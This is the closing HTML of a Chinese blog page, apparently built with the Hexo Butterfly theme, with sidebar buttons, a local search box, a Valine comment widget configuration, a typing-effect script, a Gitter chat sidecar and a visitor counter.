title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/fancybox.umd.js"></script><script src="/js/instantpage.min.js" type="module"></script><script src="/js/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>var requestSetting = function (from,set) {
+    var from = from
+    var setting = set.split(',').filter(function(item){
+    return from.indexOf(item) > -1
+    });
+    setting = setting.length == 0 ? from :setting;
+    return setting
+}
+
+var guestInfo = requestSetting(['nick','mail','link'],'')
+var requiredFields = requestSetting(['nick','mail'],'nick,mail')
+function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      master:'7f26fd285f1e832baef86f5bcaadd06a',
+      pageSize:'10',
+      lang:'zh-CN',
+      placeholder:'建议使用QQ邮箱,评论头像采用QQ头像',
+      recordIP:'true',
+      enableQQ:'true',
+      requiredFields: requiredFields,
+      appId: '9xmgN7UpSgxN7k2zu16HHcl6-gzGzoHsz',
+      appKey: '6t7uQFgue7owtGg4R7ieIYWu',
+      avatar: 'monsterid',
+      serverURLs: 'https://9xmgn7up.lc-cn-n1-shared.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('/js/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="/js/fireworks.min.js"></script><script src="/js/activate-power-mode.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script>((window.gitter = {}).chat = {}).options = {
+  disableDefaultChat: true,
+};
+document.addEventListener('gitter-sidecar-ready', (e) => {
+  const GitterChat = e.detail.Chat
+  let chat
+
+  function initGitter () {
+    chat = new GitterChat({
+      room: 'blogroom/test',
+      activationElement: '#chat_btn'
+    });
+  }
+
+  initGitter()
+
+  if (false) {
+    document.addEventListener('pjax:complete', () => {
+      chat.destroy()
+      initGitter()
+    })
+  }
+
+})</script><script src="https://sidecar.gitter.im/dist/sidecar.v1.js" async="async" defer="defer"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
